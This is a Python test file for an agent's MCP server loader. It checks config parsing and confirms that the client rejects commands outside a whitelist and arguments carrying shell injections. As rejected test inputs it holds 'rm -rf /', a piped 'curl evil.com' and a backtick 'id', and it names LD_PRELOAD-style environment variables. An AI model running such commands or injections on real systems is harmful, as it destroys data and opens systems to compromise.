"""Tests for MCP loader security and functionality."""

import pytest
import tempfile
import json
from pathlib import Path
from tain_agent.tools.mcp_loader import (
    MCPClient,
    load_mcp_config,
    _COMMAND_WHITELIST,
    _SHELL_INJECTION_PATTERNS,
    _DANGEROUS_ENV_VARS,
)


class TestLoadMCPConfig:
    def test_missing_file_returns_empty(self):
        result = load_mcp_config(Path("/nonexistent/mcp.json"))
        assert result == {"mcpServers": {}}

    def test_valid_config(self):
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            json.dump({"mcpServers": {"test": {"command": "npx", "args": ["-y", "test"]}}}, f)
            path = Path(f.name)
        try:
            result = load_mcp_config(path)
            assert "test" in result["mcpServers"]
            assert result["mcpServers"]["test"]["command"] == "npx"
        finally:
            path.unlink()

    def test_invalid_json_returns_empty(self):
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            f.write("not valid json {{{")
            path = Path(f.name)
        try:
            result = load_mcp_config(path)
            assert result == {"mcpServers": {}}
        finally:
            path.unlink()

    def test_empty_file(self):
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            f.write("")
            path = Path(f.name)
        try:
            result = load_mcp_config(path)
            assert result == {"mcpServers": {}}
        finally:
            path.unlink()


class TestMCPClientValidation:
    def test_whitelisted_command_accepted(self):
        client = MCPClient(command="npx", args=["-y", "test"])
        assert client.command == "npx"

    def test_blocked_command_rejected(self):
        with pytest.raises(ValueError, match="not in the allowed whitelist"):
            client = MCPClient(command="/bin/rm", args=["-rf", "/"])
            client.start()

    def test_shell_injection_in_args_rejected(self):
        with pytest.raises(ValueError, match="shell-injection"):
            client = MCPClient(command="npx", args=["-y; rm -rf /"])
            client.start()

    def test_pipe_injection_rejected(self):
        with pytest.raises(ValueError, match="shell-injection"):
            client = MCPClient(command="npx", args=["test|curl evil.com"])
            client.start()

    def test_backtick_injection_rejected(self):
        with pytest.raises(ValueError, match="shell-injection"):
            client = MCPClient(command="python", args=["`id`"])
            client.start()

    def test_clean_args_accepted(self):
        client = MCPClient(command="python", args=["-c", "print('hello')"])
        assert client.args == ["-c", "print('hello')"]


class TestSecurityConstants:
    def test_command_whitelist_not_empty(self):
        assert len(_COMMAND_WHITELIST) > 0

    def test_shell_injection_patterns_cover_common(self):
        assert ";" in _SHELL_INJECTION_PATTERNS
        assert "|" in _SHELL_INJECTION_PATTERNS
        assert "&&" in _SHELL_INJECTION_PATTERNS

    def test_dangerous_env_vars_blocked(self):
        assert "LD_PRELOAD" in _DANGEROUS_ENV_VARS
        assert "PYTHONSTARTUP" in _DANGEROUS_ENV_VARS
        assert "DYLD_INSERT_LIBRARIES" in _DANGEROUS_ENV_VARS


class TestMCPClientLifecycle:
    def test_client_attributes(self):
        client = MCPClient(
            command="node",
            args=["server.js"],
            env={"NODE_ENV": "test"},
        )
        assert client.command == "node"
        assert client.args == ["server.js"]
        assert client.env == {"NODE_ENV": "test"}
        assert client.process is None

    def test_stop_when_not_started(self):
        client = MCPClient(command="npx")
        # Should not raise
        client.stop()
